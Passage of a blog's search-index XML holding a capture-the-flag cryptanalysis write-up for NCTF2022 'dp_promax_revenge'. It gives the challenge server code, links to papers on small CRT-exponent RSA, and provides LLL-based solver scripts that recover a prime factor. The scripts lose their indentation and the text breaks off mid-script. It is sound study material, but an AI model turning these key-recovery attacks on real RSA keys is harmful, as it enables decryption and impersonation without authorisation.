<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Some topics about RSA-CRT</title>
      <link href="/2023/03/06/Some-topics-about-RSA-CRT/"/>
      <url>/2023/03/06/Some-topics-about-RSA-CRT/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Some-topics-about-RSA-CRT"><a href="#Some-topics-about-RSA-CRT" class="headerlink" title="Some topics about RSA-CRT"></a>Some topics about RSA-CRT</h1><p> <a href="https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf">New Attacks on RSA with Small Secret CRT-Exponents</a></p><h2 id="An-Approach-That-Works-for-q-lt-N-0-468"><a href="#An-Approach-That-Works-for-q-lt-N-0-468" class="headerlink" title="An Approach That Works for q &lt; N^0.468"></a>An Approach That Works for q &lt; N^0.468</h2><h3 id="NCTF2022-dp-promax-revenge"><a href="#NCTF2022-dp-promax-revenge" class="headerlink" title="NCTF2022 dp_promax _revenge"></a>NCTF2022 dp_promax _revenge</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        proof = (<span class="string">&#x27;&#x27;</span>.join([choice(table) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)])).encode()</span><br><span class="line">        sha = sha256(proof).hexdigest().encode()</span><br><span class="line">        self.send(<span class="string">b&quot;[+] sha256(XXXX+&quot;</span> + proof[<span class="number">4</span>:] + <span class="string">b&quot;) == &quot;</span> + sha)</span><br><span class="line">        XXXX = self.recv(prompt=<span class="string">b&#x27;[+] Plz Tell Me XXXX :&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(XXXX) != <span class="number">4</span> <span class="keyword">or</span> sha256(XXXX + proof[<span class="number">4</span>:]).hexdigest().encode() != sha:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">120</span>)</span><br><span class="line">        <span class="comment"># if not self.proof_of_work():</span></span><br><span class="line">        <span class="comment">#     self.send(b&#x27;Oops,you are wrong. Bye~&#x27;)</span></span><br><span class="line">        <span class="comment">#     self.request.close()</span></span><br><span class="line">        <span class="comment"># self.send(b&#x27;NOW! You are prohibited from using factordb!&#x27;)</span></span><br><span class="line">        self.send(<span class="string">b&#x27;Someone says\nTHOSE WHO SUBMIT THE FACTORIZATION TO FACTOR.DB WEBSITE&#x27;</span>)</span><br><span class="line">        self.send(<span class="string">b&#x27;During the competition\nNaive!!!&#x27;</span>)</span><br><span class="line">        nbits = <span class="number">2200</span></span><br><span class="line">        beta = <span class="number">0.4090</span></span><br><span class="line">        p, q = getPrime(<span class="built_in">int</span>((<span class="number">1.</span> - beta) * nbits)), getPrime(<span class="built_in">int</span>(beta * nbits))</span><br><span class="line">        dp = getrandbits(<span class="number">50</span>) | <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            d = (p - <span class="number">1</span>) * getrandbits(<span class="number">2800</span>) + dp</span><br><span class="line">            <span class="keyword">if</span> GCD((p - <span class="number">1</span>) * (q - <span class="number">1</span>), d) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">        N = p * q</span><br><span class="line">        self.send(<span class="built_in">str</span>(e).encode())</span><br><span class="line">        self.send(<span class="built_in">str</span>(N).encode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;N =&#x27;</span>, N)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;e =&#x27;</span>, e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;dp =&#x27;</span>, dp)</span><br><span class="line">        self.send(<span class="string">b&#x27;Tell me q:&#x27;</span>)</span><br><span class="line">        check = <span class="built_in">int</span>(self.recv())</span><br><span class="line">        <span class="keyword">if</span> check == q:</span><br><span class="line">            flag = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">            self.send(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.send(<span class="string">b&#x27;Naive!&#x27;</span>)</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5003</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HOST:POST &quot;</span> + HOST + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(PORT))</span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ul><li><p><a href="https://link.springer.com/content/pdf/10.1007/3-540-45708-9_16.pdf">https://link.springer.com/content/pdf/10.1007/3-540-45708-9_16.pdf</a></p><p>bound up to 0.382 in 2002.</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221204155010319.png" alt="image-20221204155010319"></p></li><li><p><a href="https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf">https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf</a></p><p>bound up to 0.468 in 2006</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221204155028430.png" alt="image-20221204155028430"></p></li><li><p><a href="https://nitaj.users.lmno.cnrs.fr/rsa21.pdf">https://nitaj.users.lmno.cnrs.fr/rsa21.pdf</a></p><p>crypto-attack有 (不符合这题)</p></li><li><p><a href="https://eprint.iacr.org/2017/092.pdf">https://eprint.iacr.org/2017/092.pdf</a><br><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20221204181734653.png" alt="image-20221204181734653"></p><p>大总结、提升，2017</p><p>参考代码</p><ul><li><a href="https://github.com/Giantpizzahead/ctf-archive/blob/79329f1e25f46b3e4474ef0ac2fd764f414bbbca/picoCTF%202021/Cryptography/not_my_fault1/old_stuff/solve.py">https://github.com/Giantpizzahead/ctf-archive/blob/79329f1e25f46b3e4474ef0ac2fd764f414bbbca/picoCTF%202021/Cryptography/not_my_fault1/old_stuff/solve.py</a></li></ul></li></ul><h4 id="0-2090"><a href="#0-2090" class="headerlink" title="0.2090"></a>0.2090</h4><p>ceil、LLL改写为SageMath</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Small CRT-Exponent RSA Revisited</span></span><br><span class="line"><span class="string">Atsushi Takayasu, Yao Lu, and Liqiang Peng</span></span><br><span class="line"><span class="string">https://www.iacr.org/archive/eurocrypt2017/10210359/10210359.pdf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">from</span> sympy.abc <span class="keyword">import</span> x, y, a, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="comment"># getcontext().prec= int(13000)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Computes the Euclidean norm of a vector.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">norm_vector</span>(<span class="params">v1</span>):</span></span><br><span class="line"><span class="keyword">return</span> vector(v1).norm()</span><br><span class="line"><span class="comment"># return np.linalg.norm(np.array(vector, dtype=int))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Computes the determinant of an array.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">det_matrix</span>(<span class="params">m1</span>):</span></span><br><span class="line"><span class="keyword">return</span> matrix(m1).determinant()</span><br><span class="line"><span class="comment"># return abs(np.linalg.det(np.array(matrix, dtype=int)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Solves R simultaneous integer equations.</span></span><br><span class="line"><span class="string">Use sympy to pass in the expressions, they will all be set equal to 0!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_equations</span>(<span class="params">equations</span>):</span></span><br><span class="line">sol = sympy.solvers.solve(equations)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Solution:&#x27;</span>, sol)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">return</span> sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Applies the LLL algorithm on the given matrix.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apply_lll</span>(<span class="params">m1</span>):</span></span><br><span class="line">res = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(matrix(m1).LLL())]</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Constants</span></span><br><span class="line">N = <span class="number">58487976221663725251698953238414184555799872988213065541326541848885215893351093527468689012074040254434950892711093181252798978183366157764907511604519312167773344374619520035173567442865542213233219579024869080302405043524112358593745269725658160900550671810010386499092323659956085315415466097535992267619145035677260494369985818247021733199769488837572215995342059425429983354601803501269806913004958305194168757883849875161660663633578777056408048946697609101080753832091499118918301554760560424789740828566659108340292888095306763432206416039633082087799027414547164268809477646324236088343603338823558775321678655779148910828174055171222311721186183105447</span></span><br><span class="line">e = <span class="number">10633448653607551712959485779318916984680881904087092592736666591521718922157496175170352380413830988245341716261207773531773881772973200758758858367755907702781988919789702439599771348529734889705227393136517961678638152733284139885398339252117421150860409474301240948113164074002039978186447868594784102679359403035238186009186365059015273907757650554018153056669959748469491906959012249453656319157630009181019513718929003755514504451628293258526380829454180114343247323174078617780537158051598016819746350529029809988988328868189870959651538714881145369173341953425576952866684167047408928224681030760646206709711916606604834348192837570815947453602645387253</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="comment"># Calculate needed values</span></span><br><span class="line"><span class="comment"># num_variables = 2</span></span><br><span class="line">alpha = log(e, N)</span><br><span class="line">beta = <span class="number">0.4090</span></span><br><span class="line">delta = <span class="number">50</span>/<span class="number">2200</span></span><br><span class="line"><span class="comment"># Bounded by values</span></span><br><span class="line"><span class="comment"># ceil(2 * N^(alpha + beta + delta - 1))</span></span><br><span class="line">X_p = ceil(<span class="number">2</span> * N^(alpha + beta + delta - <span class="number">1</span>))</span><br><span class="line">X_q = ceil(<span class="number">2</span> * N^(alpha + beta + delta - <span class="number">1</span>))</span><br><span class="line">Y_p = ceil(<span class="number">2</span>*N^beta)</span><br><span class="line">Y_q = ceil(<span class="number">2</span>*N^(<span class="number">1</span>-beta))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;alpha:&#x27;</span>, alpha)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;beta:&#x27;</span>, beta)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;delta:&#x27;</span>, delta)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;X_p, X_q:&#x27;</span>, X_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Y_p:&#x27;</span>, Y_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Y_q:&#x27;</span>, Y_q)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create matrix</span></span><br><span class="line">constants = [<span class="number">1</span>, X_p, X_p*Y_p, Y_p, X_p*Y_p**<span class="number">2</span>, X_q*Y_q]</span><br><span class="line">variables = [<span class="number">1</span>, x, x*y, y, x*y**<span class="number">2</span>, a*b]</span><br><span class="line">mat = [</span><br><span class="line">[e, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, e, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[N, N, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, e, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, N, N, -<span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(constants)):</span><br><span class="line">mat[i][j] *= constants[j]</span><br><span class="line">mat = apply_lll(mat)</span><br><span class="line"><span class="comment"># print(mat)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove constants</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(constants)):</span><br><span class="line"><span class="keyword">assert</span>(mat[i][j] % constants[j] == <span class="number">0</span>)</span><br><span class="line">mat[i][j] //= constants[j]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate equations</span></span><br><span class="line">equations = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mat)):</span><br><span class="line">equation = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(variables)):</span><br><span class="line">equation += mat[i][j] * variables[j]</span><br><span class="line">equations.append(equation)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># Try with these equations</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> combinations(equations, <span class="number">2</span>):</span><br><span class="line">solve_equations(each)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h4 id="0-3150"><a href="#0-3150" class="headerlink" title="0.3150"></a>0.3150</h4><p>方程解法，组合求解</p><p>分数作整除处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Small CRT-Exponent RSA Revisited</span></span><br><span class="line"><span class="string">Atsushi Takayasu, Yao Lu, and Liqiang Peng</span></span><br><span class="line"><span class="string">https://www.iacr.org/archive/eurocrypt2017/10210359/10210359.pdf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="keyword">from</span> sympy.abc <span class="keyword">import</span> x, y, a, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="comment"># getcontext().prec= int(13000)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Computes the Euclidean norm of a vector.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">norm_vector</span>(<span class="params">v1</span>):</span></span><br><span class="line"><span class="keyword">return</span> vector(v1).norm()</span><br><span class="line"><span class="comment"># return np.linalg.norm(np.array(vector, dtype=int))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Computes the determinant of an array.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">det_matrix</span>(<span class="params">m1</span>):</span></span><br><span class="line"><span class="keyword">return</span> matrix(m1).determinant()</span><br><span class="line"><span class="comment"># return abs(np.linalg.det(np.array(matrix, dtype=int)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Solves R simultaneous integer equations.</span></span><br><span class="line"><span class="string">Use sympy to pass in the expressions, they will all be set equal to 0!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_equations</span>(<span class="params">equations</span>):</span></span><br><span class="line">sol = sympy.solvers.solve(equations)</span><br><span class="line"><span class="keyword">if</span> sol:</span><br><span class="line"><span class="comment"># print(&#x27;Solution:&#x27;, sol)</span></span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> sol:</span><br><span class="line">tmp = <span class="built_in">str</span>(tmp)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;y:&#x27;</span> <span class="keyword">in</span> tmp:</span><br><span class="line">y = <span class="built_in">int</span>(<span class="built_in">eval</span>(((tmp.split(<span class="string">&#x27;y: &#x27;</span>)[-<span class="number">1</span>][:-<span class="number">1</span>])).replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;//&#x27;</span>)))</span><br><span class="line"><span class="keyword">if</span> y:</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">return</span> sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Applies the LLL algorithm on the given matrix.</span></span><br><span class="line"><span 